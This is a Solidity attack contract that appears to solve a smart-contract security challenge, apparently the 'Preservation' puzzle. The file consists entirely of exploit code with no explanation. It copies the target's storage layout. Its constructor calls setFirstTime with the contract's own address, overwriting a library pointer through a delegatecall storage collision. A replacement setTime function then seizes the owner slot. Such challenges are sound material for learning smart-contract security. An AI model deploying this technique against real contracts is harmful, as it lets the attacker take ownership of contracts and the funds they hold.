pragma solidity ^0.6.0;

interface Target {
    function setFirstTime(uint _timeStamp) external;
    function setSecondTime(uint _timeStamp) external;
}

contract Crack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    Target target;

    constructor(address _target) public {
        target = Target(_target);
        target.setFirstTime(uint(uint160(address(this))));
    }

    function setTime(uint _time) public {
        owner = msg.sender;
    }

}